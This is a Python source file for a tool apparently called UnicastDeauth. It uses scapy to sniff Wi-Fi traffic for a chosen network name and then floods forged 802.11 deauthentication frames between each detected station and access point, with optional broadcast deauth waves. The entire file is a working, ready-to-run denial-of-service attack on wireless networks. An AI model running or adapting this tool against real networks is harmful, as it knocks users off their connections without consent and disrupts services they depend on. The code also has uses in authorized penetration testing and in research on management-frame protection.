#!/usr/bin/env python3

# UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/UnicastDeauth
# style guide - https://google.github.io/styleguide/pyguide.html

# TODO
#
# offer targeting bssids instead of an essid
# add module docstring
# check for protected management frames

import argparse
import multiprocessing
from re import compile as re_compile
from scapy import sendrecv
from scapy.layers import dot11
import sys

BROADCAST = 'ff:ff:ff:ff:ff:ff'
DEAUTH_COUNT = 64

class MsgException(Exception):
    def __init__(self, exception, message = 'Unknown error', *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.exception = exception
        self.message = message
    
    def __str__(self):
        return f'[!] Error! {self.message}:\n    {self.exception}'

def bssids_whitelist_type(bssids_whitelist_string):
    '''comma-separated bssids whitelist parsing'''
    
    try:
        bssids_whitelist = set()
        bssids_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
        for bssid in bssids_whitelist_string.split(','):
            bssid = bssid.strip().lower()
            if bssids_regex.match(bssid):
                bssids_whitelist.add(bssid)
    except Exception as e:
        raise MsgException(e, 'Comma-separated BSSIDs whitelist could not be processed')
    return bssids_whitelist

def panic(msg_exception):
    '''exception handling'''
    
    print(msg_exception, file = sys.stderr)

def print_info(message):
    '''additional info printing'''
    
    print(f'[!] Info: {message}', file = sys.stderr)

def is_unicast(bssid):
    '''bssid type checking'''
    
    try:
        unicast = not (int(bssid.split(':')[0], 16) & 0x1)
    except Exception as e:
        raise MsgException(e, 'BSSID could not be processed')
    return unicast

def get_src_dst_network(frame):
    '''frame control field parsing'''
    
    try:
        to_ds = frame.FCfield & 0x1
        from_ds= frame.FCfield & 0x2
        if to_ds:
            bssid_dst = frame.addr3
            if not from_ds:
                bssid_src = frame.addr2
                bssid_network = frame.addr1
        else:
            bssid_dst = frame.addr1
            if from_ds:
                bssid_src = frame.addr3
                bssid_network = frame.addr2
            else:
                bssid_src = frame.addr2
                bssid_network = frame.addr3
    except Exception as e:
        raise MsgException(e, 'Frame Control field could not be processed')
    return bssid_src, bssid_dst, bssid_network

def register_ap(wifi_essid, bssid_ap, bssids_aps):
    '''ap registration'''
    
    try:
        bssids_aps.add(bssid_ap)
        print_info(
            f'AP detected for network {wifi_essid}'
            f'\n    access point = {bssid_ap}'
        )
    except Exception as e:
        raise MsgException(e, 'Detected access point could not be registered')

def register_sta(wifi_essid, bssid_sta, bssid_ap, bssids_stas_dict):
    '''sta registration'''
    
    try:
        bssids_stas_dict.update({bssid_sta: bssid_ap})
        print_info(
            f'STA detected for network {wifi_essid}'
            f'\n    station      = {bssid_sta}'
            f'\n    access point = {bssid_ap}'
        )
    except Exception as e:
        raise MsgException(e, 'Detected station could not be registered')

def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network):
    '''unicast deauthentication'''
    
    try:
        def unicast_deauth_parallel():
            sys.stderr = sys.stdout = None
            for i in range(deauth_waves):
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
                    dot11.Dot11Deauth(reason = 7),
                    iface = wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
                    dot11.Dot11Deauth(reason = 7),
                    iface = wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
        multiprocessing.Process(target = unicast_deauth_parallel).start()
        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
    except Exception as e:
        raise MsgException(e, 'Unicast deauthentication frames could not be sent')

def broadcast_deauth(wifi_interface, deauth_waves, bssid_ap, bssid_network):
    '''broadcast deauthentication'''
    
    try:
        def broadcast_deauth_parallel():
            sys.stderr = sys.stdout = None
            for i in range(deauth_waves):
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
                    dot11.Dot11Deauth(reason = 7),
                    iface = wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
        multiprocessing.Process(target = broadcast_deauth_parallel).start()
        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
    except Exception as e:
        raise MsgException(e, 'Broadcast deauthentication frames could not be sent')

def sniffer_wrapper(wifi_interface, wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, bssids_aps, bssids_stas_dict):
    def sniffer_handler(frame):
        '''sniffed frame processing'''
        
        try:
            bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
            if bssid_src and bssid_dst and bssid_network:
                
                # wlan type mgt subtype beacon or wlan type mgt subtype probe-resp
                if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
                    if (bssid_src not in bssids_whitelist) and (bssid_src not in bssids_aps):
                        dot11_element = frame.getlayer(dot11.Dot11Elt)
                        while dot11_element:
                            if dot11_element.ID == 0:
                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                    register_ap(wifi_essid, bssid_src, bssids_aps)
                                    if broadcast_enabled:
                                        broadcast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_network)
                                break
                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                
                # wlan type mgt subtype probe-req
                elif frame.haslayer(dot11.Dot11ProbeReq):
                    if (bssid_dst not in bssids_whitelist) and is_unicast(bssid_dst) and (bssid_dst not in bssids_aps):
                        dot11_element = frame.getlayer(dot11.Dot11Elt)
                        while dot11_element:
                            if dot11_element.ID == 0:
                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                    register_ap(wifi_essid, bssid_dst, bssids_aps)
                                    if broadcast_enabled:
                                        broadcast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_network)
                                break
                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                
                # wlan type ctl or wlan type data: from ap to sta, from sta to ap
                else:
                    if (bssid_src in bssids_aps) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                        register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
                        unicast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_src, bssid_network)
                    elif (bssid_dst in bssids_aps) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
                        register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
                        unicast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_dst, bssid_network)
        
        except Exception as e:
            raise MsgException(e, 'Sniffed frames could not be processed')
    return sniffer_handler

def main():
    '''main'''
    
    try:
        examples = [
            'UnicastDeauth.py -i wlan0 -e target -b',
            'UnicastDeauth.py -i wlan0 -e target -n 8',
            'UnicastDeauth.py -i wlan0 -e target -wl 00:11:22:33:44:00,00:11:22:33:44:55',
        ]
        parser = argparse.ArgumentParser(
            description = 'UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks',
            formatter_class = argparse.RawTextHelpFormatter,
            epilog = 'examples:\n  ' + '\n  '.join(examples),
        )
        parser.add_argument(
            '-i',
            dest = 'wifi_interface',
            help = 'Wi-Fi interface',
            required = True,
        )
        parser.add_argument(
            '-e',
            dest = 'wifi_essid',
            help = 'target Wi-Fi ESSID',
            required = True,
        )
        parser.add_argument(
            '-b',
            dest = 'broadcast_enabled',
            help = 'broadcast deauthentication flag',
            required = False,
            action = 'store_true',
        )
        parser.add_argument(
            '-n',
            dest = 'deauth_waves',
            help = 'number of deauthentication waves',
            required = False,
            type = int,
            default = 1,
        )
        parser.add_argument(
            '-wl',
            dest = 'bssids_whitelist',
            help = 'comma-separated BSSIDs whitelist',
            required = False,
            type = bssids_whitelist_type,
            default = [],
        )
        args = parser.parse_args()
        filters = [
            'wlan type mgt subtype beacon',
            'wlan type mgt subtype probe-req',
            'wlan type mgt subtype probe-resp',
            'wlan type ctl',
            'wlan type data',
        ]
        bssids_aps = set()
        bssids_stas_dict = {} # {sta bssid: ap bssid}
        sendrecv.sniff(
            iface = args.wifi_interface,
            filter = ' or '.join(filters),
            prn = sniffer_wrapper(
                args.wifi_interface,
                args.wifi_essid,
                args.broadcast_enabled,
                args.deauth_waves,
                args.bssids_whitelist,
                bssids_aps,
                bssids_stas_dict,
            ),
        )
    except MsgException as msg_exception:
        panic(msg_exception)
    except Exception as e:
        panic(MsgException(e))
    finally:
        try:
            for child in multiprocessing.active_children():
                child.terminate()
        except:
            sys.exit(-1)

if __name__ == '__main__':
    main()
